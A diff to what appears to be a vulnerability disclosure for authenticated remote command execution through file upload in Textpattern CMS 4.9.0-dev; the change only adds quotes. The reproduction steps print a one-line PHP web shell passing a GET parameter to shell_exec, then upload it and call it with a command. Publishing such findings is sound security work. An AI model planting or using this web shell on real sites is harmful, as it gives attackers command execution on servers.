@@ -6,7 +6,7 @@ http://localhost/textpattern/textpattern/index.php?event=file&step=file_insert<b
 
 <B>Reproduction:</B><br> 
 1. Log in as the root user in Textpattern.<br> 
-2. Create a PHP web shell by making a file named rce.php with the content <?php echo shell_exec($_GET['cmd']); ?> .<br> 
+2. Create a PHP web shell by making a file named rce.php with the content "<?php echo shell_exec($_GET['cmd']); ?>" .<br> 
 3. Navigate to 'Content > Files' and upload the rce.php web shell.<br>
     ![alt text](https://github.com/patrickdeanramos/TextPattern-CMS-4.9.0-dev-Authenticated-Remote-Command-Execution-RCE-Through-File-Upload/blob/main/RCE-TextPatter-1.png?raw=True)
 5. Access the web shell directly by going to https://<url>/textpattern/files/rce.php?cmd=id.<br> 
